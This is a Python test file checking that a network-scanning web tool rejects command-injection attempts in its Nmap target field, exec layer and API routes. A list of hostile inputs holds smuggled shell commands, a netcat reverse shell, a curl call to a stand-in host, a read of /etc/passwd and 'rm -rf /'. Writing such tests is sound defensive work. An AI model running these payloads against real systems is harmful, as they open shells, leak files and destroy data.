"""Can operator-supplied input reach a command line?

The scan engine builds an Nmap argv and the remediation engine builds an nft
argv. Both take values that originate in a browser form. These tests assert that
no such value can become a flag, a second command, or a shell construct.
"""

from __future__ import annotations

from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from backend.auth.service import AuthenticatedUser
from backend.core.exec import CommandError, run_command
from backend.core.validation import ValidationError, parse_target
from backend.main import app
from backend.scanner.nmap_runner import NmapError, build_argv

OPERATOR = AuthenticatedUser(
    id=1,
    username="injection-test-operator",
    full_name=None,
    role="operator",
    session_expires_at=datetime.now(timezone.utc) + timedelta(hours=1),
)


@pytest.fixture(scope="module")
def client():
    from backend.auth import middleware

    original = middleware.resolve_session
    middleware.resolve_session = lambda token, **kwargs: OPERATOR
    with TestClient(app, cookies={"cybershield_session": "stub"}) as test_client:
        try:
            yield test_client
        finally:
            middleware.resolve_session = original


# Values a hostile or careless operator might type into the target field.
HOSTILE_TARGETS = [
    "192.168.56.10 --script=vuln",
    "192.168.56.10;id",
    "192.168.56.10 && curl http://evil.test",
    "192.168.56.10|nc -e /bin/sh 10.0.0.1 4444",
    "$(whoami)",
    "`id`",
    "-oX /tmp/owned.xml",
    "--script /tmp/evil.nse",
    "192.168.56.10\nid",
    "192.168.56.10 -iL /etc/passwd",
    "; rm -rf /",
    "192.168.56.10/24 --privileged",
]


class TestTargetParsing:
    """The first gate: a target must parse as IPv4 or it never proceeds."""

    @pytest.mark.parametrize("value", HOSTILE_TARGETS)
    def test_hostile_target_is_rejected_at_parse(self, value: str) -> None:
        with pytest.raises(ValidationError):
            parse_target(value)

    def test_a_parsed_target_renders_as_a_bare_network(self) -> None:
        # Whatever came in, what goes out is the output of ipaddress parsing —
        # so it cannot carry a flag or a shell metacharacter.
        parsed = parse_target("192.168.56.10/24")
        assert str(parsed.network) == "192.168.56.0/24"
        assert all(c not in str(parsed.network) for c in ";|&$`\n ")


class TestArgvConstruction:
    """The second gate: the runner owns every argument Nmap receives."""

    def test_profile_cannot_set_the_output_path(self, config) -> None:
        from backend.core.config import ScanProfile

        rogue = ScanProfile(
            name="rogue",
            description="tries to control -oX",
            args=("-sT", "-oX", "/tmp/attacker.xml"),
            timeout_seconds=60,
        )
        with pytest.raises(NmapError, match="controlled by"):
            build_argv(rogue, parse_target("192.168.56.10"), Path("/tmp/out.xml"))

    def test_target_is_the_final_single_argument(self, config) -> None:
        argv = build_argv(
            config.scan_profiles["service_detect"],
            parse_target("192.168.56.10"),
            Path("/tmp/out.xml"),
        )
        assert argv[0] == "nmap"
        assert argv[-1] == "192.168.56.10/32"
        # -oX is set by the runner, immediately before the target.
        assert argv[-3] == "-oX"

    def test_port_list_entries_are_validated_integers(self, config) -> None:
        with pytest.raises(ValidationError):
            build_argv(
                config.scan_profiles["service_detect"],
                parse_target("192.168.56.10"),
                Path("/tmp/out.xml"),
                ports=["22; id"],  # type: ignore[list-item]
            )


class TestExecLayer:
    """The third gate: no shell, ever."""

    def test_a_command_string_is_refused(self) -> None:
        with pytest.raises(CommandError, match="shell-injection"):
            run_command("echo hi", timeout_seconds=5)  # type: ignore[arg-type]

    def test_nul_bytes_are_refused(self) -> None:
        with pytest.raises(CommandError, match="NUL"):
            run_command(["echo", "a\x00b"], timeout_seconds=5)

    def test_metacharacters_are_passed_through_literally(self) -> None:
        # Proof there is no shell: these are one literal argument, not a
        # command separator and a second command.
        result = run_command(["echo", "a; id && whoami"], timeout_seconds=10)
        assert result.stdout.strip() == "a; id && whoami"

    def test_timeout_is_mandatory_and_positive(self) -> None:
        with pytest.raises(CommandError):
            run_command(["echo", "hi"], timeout_seconds=0)


class TestApiSurface:
    """The route layer must not accept a profile or flag it does not know."""

    def test_unknown_profile_is_rejected(self, client) -> None:
        response = client.post(
            "/api/scans",
            json={
                "target": "192.168.64.12",
                "kind": "service_detect",
                "profile": "--script=vuln",
            },
        )
        assert response.status_code == 400
        assert "Unknown profile" in response.json()["detail"]

    def test_hostile_target_is_rejected_by_the_api(self, client) -> None:
        response = client.post(
            "/api/scans",
            json={"target": "192.168.64.12 --script=vuln", "kind": "service_detect"},
        )
        # 403 (out of scope) — the value cannot parse as an authorized target,
        # so it is refused before any argv is built.
        assert response.status_code == 403

    def test_hostile_target_is_rejected_by_the_form(self, client) -> None:
        response = client.post(
            "/scans",
            data={"target": "192.168.64.12;id", "kind": "service_detect"},
            follow_redirects=False,
        )
        assert response.status_code == 303
        assert "error=" in response.headers["location"]

    def test_scan_kind_is_constrained(self, client) -> None:
        response = client.post(
            "/api/scans", json={"target": "192.168.64.12", "kind": "exploit"}
        )
        assert response.status_code == 400
